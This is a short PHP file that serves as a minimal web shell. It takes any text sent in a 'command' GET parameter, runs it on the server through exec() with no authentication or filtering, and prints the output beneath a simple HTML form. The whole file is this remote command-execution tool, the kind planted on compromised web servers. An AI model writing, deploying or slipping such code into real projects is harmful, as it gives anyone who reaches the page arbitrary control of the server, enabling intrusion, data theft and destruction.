<?php
    if(isset($_GET['command'])){
        $result=exec($_GET['command']);
    }
?>
<form method="GET">
    <input type="text" name="command">
    <input type="submit" value="SEND">
</form>
<?php
    if($result){
        echo $result;
    }
?>
